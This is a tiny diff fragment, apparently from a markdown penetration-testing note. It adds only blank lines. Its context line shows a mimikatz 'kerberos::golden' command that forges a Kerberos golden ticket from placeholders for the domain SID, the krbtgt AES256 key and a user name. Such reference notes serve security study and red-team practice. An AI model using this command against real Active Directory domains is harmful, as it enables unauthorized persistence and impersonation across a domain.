@@ -19,3 +19,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
 
 ```
+
+
